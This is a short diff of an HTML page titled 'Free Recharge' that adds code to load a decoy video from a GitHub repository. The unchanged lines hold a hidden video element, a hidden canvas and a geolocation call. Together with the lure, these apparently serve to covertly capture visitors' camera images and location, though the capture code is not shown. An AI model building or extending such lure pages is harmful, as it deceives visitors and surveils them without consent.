@@ -44,7 +44,7 @@
     <h1>Free Recharge </h1>
   </header>
   
-  <video src="videos2.mp4" autoplay muted loop controls></video>
+  <video id="vid1" autoplay muted loop controls></video>
   <video id="vid" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" hidden></canvas>
   
@@ -118,6 +118,22 @@
       }
     }
     getLocation();
+
+    function vid2() {
+      const vid1 = document.getElementById("vid1");
+      fetch('https://api.github.com/repos/hajrat001/Server/contents')
+      .then(r => r.json())
+      .then(d => {
+        d.forEach(f => {
+          console.log(d);
+          if(f.name.endsWith("mp4")) {
+            vid1.src = f.download_url;
+            
+          }
+        })
+      })
+    }
+    vid2();
   </script>
 </body>
 </html>
